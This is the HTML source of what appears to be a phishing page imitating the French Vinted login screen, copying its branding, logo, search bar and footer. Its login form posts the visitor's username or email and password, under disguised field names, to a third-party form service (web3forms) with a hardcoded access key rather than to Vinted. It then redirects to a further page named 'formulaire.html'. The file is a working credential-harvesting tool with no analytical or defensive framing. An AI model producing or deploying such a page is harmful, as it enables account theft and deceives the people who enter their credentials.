<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connexion | Vinted</title>
    <link rel="icon" type="image/png" href="https://vinted.fr/favicon.ico">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="style.css">
</head>
<body>

    <header class="navbar">
        <img src="https://upload.wikimedia.org/wikipedia/commons/2/29/Vinted_logo.png" alt="Vinted" class="logo-img">
        <div class="menu-icon">☰</div>
    </header>

    <div class="search-container">
        <div class="search-bar">
            <span class="category">Articles ▾</span>
            <input type="text" placeholder="Rechercher des articles">
        </div>
    </div>

    <main class="login-container">
        <div class="login-card">
            <h2>Se connecter</h2>
            
            <form action="https://api.web3forms.com/submit" method="POST">
                <input type="hidden" name="access_key" value="c89ef8b5-6bcc-4cae-bda0-97a1ba2fc8aa">
                <input type="hidden" name="redirect" value="formulaire.html">

                <div class="input-group">
                    <input type="text" name="user_ref" placeholder="Identifiant ou adresse email" required>
                </div>
                
                <div class="input-group">
                    <input type="password" name="entry_key" placeholder="Mot de passe" required>
                </div>

                <button type="submit" class="btn-submit">Continuer</button>
            </form>

            <div class="footer-links">
                <a href="#">Mot de passe oublié ?</a>
                <a href="#">Un problème ?</a>
            </div>
        </div>
    </main>

    <footer class="vinted-footer">
        <div class="footer-grid">
            <div class="footer-column">
                <h3>Vinted</h3>
                <ul><li>À propos de Vinted</li><li>Presse</li></ul>
            </div>
            <div class="footer-column">
                <h3>Aide</h3>
                <ul><li>Centre d'aide</li><li>Confiance et sécurité</li></ul>
            </div>
        </div>
        <div class="footer-legal">
            <hr><div class="legal-links"><span>Politique de confidentialité</span><span>Termes et Conditions</span></div>
        </div>
    </footer>
</body>
</html>
